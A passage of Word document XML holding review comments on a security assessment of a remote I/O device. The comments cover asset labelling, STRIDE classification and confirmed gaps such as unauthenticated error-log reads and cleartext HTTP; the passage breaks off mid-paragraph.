      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="6ECD6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8BB98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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Asset F – "unauthenticated cleartext exposure channel"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17B87" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
              </w:rPr>
              <w:t>⚠</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Label </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>error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CC48F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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">In your own master table, </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Asset F = "Separation of Safety and Non-Safety Domain."</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> What you </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>describe</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> here is the </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>IoT-Core service / COM communication path</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, i.e., </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Asset H</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (or the IoT-Core service itself). </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Re-label to Asset H</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (or "IoT-Core access channel") to preserve traceability — an examiner cross-checking your asset table will catch this. The </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>domain-separation</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Asset F is relevant too (the log lives on the non-safety COM), but not as "the exposure channel."</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58BFEC55" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">STRIDE — Information Disclosure (primary) + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is correct.</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>One</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>refinement</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DA70FD" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Information Disclosure (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — anyone on the segment reads the log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D7A45" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Elevation of Privilege</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — reframe precisely: it is not "privilege escalation" so much as </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>absence of any privilege boundary</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no authentication → every reader has full read access by default). Consider labelling it**"missing authorization boundary"** rather than </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, since there is no </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>elevation</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — there is simply </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no gate</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B8732C" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering (note).</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> No documented </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>delete/erase</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> command (your point) means the "restrict/control disclosure" obligation also lacks a </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>controlled-deletion</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> capability — relevant to CR 3.9's data-lifecycle limb.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16272B1D" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77ADBFFD" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Your "None implemented" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>characterisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accurate and confirmed</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F5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615"/>
        <w:gridCol w:w="4521"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="7B4384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AB3F8D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B1DAC4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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8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22632E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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Confirmed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="275DB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548FD" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">Error log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>readable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> via IoT-Core, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>auth</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>gate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E0586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lang w:val="en-US"/>
              </w:rPr>
              <w:t>SRIO-10662 (IoT-readable); SRIO-8299 (password/auth dropped)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6C9EE" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> No authentication/authorization on reads. </w:t>
            </w:r>
            <w:hyperlink r:id="rId341" w:history="1">
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId342" w:history="1">
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="270D43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C9C1A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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">IoT-Core incoming HTTP, </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no HTTPS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D6D63" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>SRIO-7903/7907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A1D92" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Cleartext channel (CR 4.3 fails). </w:t>
            </w:r>
            <w:hyperlink r:id="rId343" w:history="1">
              <w:r w:rsidRPr="00F91F55">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00F91F55">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00F91F55">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="1ACFD6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521B4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 xml:space="preserve">2 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>concurrent</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>connections</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>incoming-only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AD2A2" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>SRIO-7909/7908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F34F7" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Resource cap only — </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> an access-control or purpose-limitation. </w:t>
            </w:r>
            <w:hyperlink r:id="rId344" w:history="1">
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="13405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C6B3E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t>No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documented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delete</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>erase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command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AF7AD" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>absence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8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C6CA2" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Your point — no controlled-deletion lifecycle. </w:t>
            </w:r>
            <w:hyperlink r:id="rId345" w:history="1">
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="001D17A8">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25BB14C9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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Gap validation — your three-part gap is confirmed; I add the decisive framing and one nuance:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15193B10" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (no authentication/authorization — confirmed, but state the root cause).</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> There is </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no gate</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> because the device has </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no user identity model at all</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (password </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">protection deliberately removed, SRIO-8299). So RQ-014's "restrict access exclusively to [X]" is </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>architecturally impossible</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: you cannot restrict access </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to a party</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on a device that </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot identify any party</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. CR 2.1 fails </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>because</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> CR 1.1/1.2 are absent — that causal chain is your strongest sentence. </w:t>
      </w:r>
      <w:hyperlink r:id="rId346" w:history="1">
